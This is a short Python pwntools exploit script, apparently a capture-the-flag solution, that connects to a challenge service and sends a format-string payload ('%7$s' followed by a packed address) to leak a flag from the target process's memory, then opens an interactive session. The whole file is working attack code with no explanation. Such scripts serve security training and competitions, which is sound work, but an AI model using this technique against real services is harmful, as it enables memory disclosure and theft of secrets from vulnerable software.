from pwn import *

context.arch = 'amd64'

#r = remote('127.0.0.1',8888)
r = remote('csie.ctf.tw',10133)

r.recvuntil('?')


flag_addr = 0x600ba0
format_str = '%7$s.aaa' + p64(flag_addr)
r.send(format_str)
#r.sendline'cat ./home/ret2plt/flag')
r.interactive()

